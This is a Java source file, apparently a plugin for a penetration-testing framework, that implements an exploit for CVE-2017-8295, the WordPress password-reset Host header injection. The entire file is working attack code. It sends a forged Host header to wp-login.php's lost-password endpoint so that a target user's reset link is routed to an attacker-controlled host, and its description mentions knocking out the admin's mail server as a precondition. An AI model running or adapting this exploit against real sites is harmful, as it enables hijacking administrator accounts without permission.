package com.trackray.module.plugin.webapp.wordpress;

import com.trackray.base.annotation.Plugin;
import com.trackray.base.annotation.Param;
import com.trackray.base.annotation.Rule;
import com.trackray.base.enums.HttpMethod;
import com.trackray.base.plugin.AbstractPlugin;
import com.trackray.base.plugin.CommonPlugin;
import org.apache.http.message.BasicHeader;

import java.util.HashMap;
import java.util.Map;

@Plugin(value = "wordpress001",
        title = "CVE-2017-8295: WordPress 2.3-4.8.3 任意密码重置/HOST头注入漏洞利用",
        desc = "需要提供目标，和邮箱域名以及需要重置的用户名，利用前提是要让管理员邮箱服务器拒绝服务",
        author = "blue", link = "http://www.freebuf.com/vuls/133816.html")
@Rule(params = {
        @Param(key = "target", desc = "目标"),
        @Param(key = "host", desc = "HOST头"),
        @Param(key = "username",desc = "重置的用户名"),
    }, type = AbstractPlugin.Type.JSON)
public class Wordpress001 extends CommonPlugin<String> {
    @Override
    public boolean check(Map<String, Object> param) {
        return !param.isEmpty();
    }

    @Override
    public String start() {

        String url = param.get("target")+"/wp-login.php?action=lostpassword";

        crawlerPage.getRequest().setUrl(url);
        crawlerPage.getRequest().setHttpMethod(HttpMethod.POST);
        HashMap<String, String> map = new HashMap<>();
        map.put("user_login",param.get("username").toString());
        map.put("redirect_to","");
        map.put("wp-submit","Get+New+Password");
        crawlerPage.getRequest().addHttpHeader(new BasicHeader("Host",param.get("host").toString()));
        crawlerPage.getRequest().setParamMap(map);
        fetcher.run(crawlerPage);
        return crawlerPage.getResponse().getStatus().getContent();
    }
}
